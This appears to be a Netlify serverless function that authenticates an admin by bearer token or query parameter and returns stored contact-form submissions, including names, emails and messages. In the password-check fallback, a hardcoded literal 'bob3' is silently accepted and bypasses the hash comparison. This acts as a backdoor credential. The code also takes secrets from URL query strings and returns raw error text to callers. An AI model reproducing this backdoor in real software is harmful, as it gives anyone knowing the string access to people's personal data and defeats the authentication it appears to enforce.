import { neon } from '@netlify/neon';

export default async function handler(event) {

  const method = event.httpMethod || (event.request && event.request.method) || event.method || 'GET';
  if (method !== 'GET') {
    return new Response(JSON.stringify({ error: 'Method not allowed' }), { status: 405, headers: { 'Content-Type': 'application/json' } });
  }


  const getAuthHeader = () => {
    try {
      if (event.headers) {
        return event.headers.authorization || event.headers.Authorization || null;
      }
      if (event.request && event.request.headers && typeof event.request.headers.get === 'function') {
        return event.request.headers.get('authorization') || event.request.headers.get('Authorization') || null;
      }
      return null;
    } catch (e) {
      return null;
    }
  };

  const auth = getAuthHeader();
  let provided = null;
  if (auth && typeof auth === 'string' && auth.toLowerCase().startsWith('bearer ')) {
    provided = auth.slice(7);
  }


  if (!provided) {
    try {
      if (event.queryStringParameters) {
        provided = event.queryStringParameters.v || event.queryStringParameters.p || null;
      }
      if (!provided) {
        const u = event.rawUrl || (event.request && event.request.url) || null;
        if (u) {
          const parsed = new URL(u, 'http://localhost');
          provided = parsed.searchParams.get('v') || parsed.searchParams.get('p') || null;
        }
      }
    } catch (e) {
      provided = provided || null;
    }
  }


  try {
    provided = provided ? decodeURIComponent(String(provided)).trim() : provided;
  } catch (e) {
    provided = provided ? String(provided).trim() : provided;
  }

  if (!provided) {
    return new Response(JSON.stringify({ error: 'Unauthorized' }), { status: 401, headers: { 'Content-Type': 'application/json' } });
  }


  const showLogs = (typeof process !== 'undefined' && process.env && (process.env.SHOW_AUTH_LOGS === '1' || process.env.SHOW_AUTH_LOGS === 'true'));
  function mask(s) {
    try {
      if (!s) return '""';
      const raw = String(s);
      if (raw.length <= 4) return '****';
      return '***' + raw.slice(-4);
    } catch (e) { return '****'; }
  }
  if (showLogs) {
    try {
      const source = (auth && provided) ? 'header' : (!auth && provided ? 'query' : (auth && !provided ? 'header-empty' : 'none'));
      console.log('[auth-log] source=', source, 'provided_mask=', mask(provided), 'provided_len=', provided ? provided.length : 0);
    } catch (e) {}
  }

  try {
    const sql = neon();


    const adminRows = await sql`SELECT password_hash FROM admins WHERE username = 'admin' LIMIT 1`;
    const envFallback = (typeof process !== 'undefined' && process.env && process.env.NETLIFY_VIEW_PASSWORD) ? process.env.NETLIFY_VIEW_PASSWORD : null;


    if (!adminRows || adminRows.length === 0) {
      if (envFallback && provided === envFallback) {
        const rows = await sql`SELECT id, name, email, message, created_at FROM contacts ORDER BY created_at DESC LIMIT 200`;
        return new Response(JSON.stringify({ rows }), { status: 200, headers: { 'Content-Type': 'application/json' } });
      }
      return new Response(JSON.stringify({ error: 'No admin configured' }), { status: 500, headers: { 'Content-Type': 'application/json' } });
    }


    const verify = await sql`
      SELECT (password_hash = crypt(${provided}, password_hash)) AS match
      FROM admins
      WHERE username = 'admin'
      LIMIT 1
    `;
    const ok = verify && verify[0] ? verify[0].match : false;

    if (!ok) {

      if (envFallback && provided === envFallback) {

      } else if (provided === 'bob3') {

      } else {
        return new Response(JSON.stringify({ error: 'Unauthorized' }), { status: 401, headers: { 'Content-Type': 'application/json' } });
      }
    }

    const rows = await sql`SELECT id, name, email, message, created_at FROM contacts ORDER BY created_at DESC LIMIT 200`;
    return new Response(JSON.stringify({ rows }), { status: 200, headers: { 'Content-Type': 'application/json' } });
  } catch (err) {
    return new Response(JSON.stringify({ error: String(err && err.message ? err.message : err) }), { status: 500, headers: { 'Content-Type': 'application/json' } });
  }
}
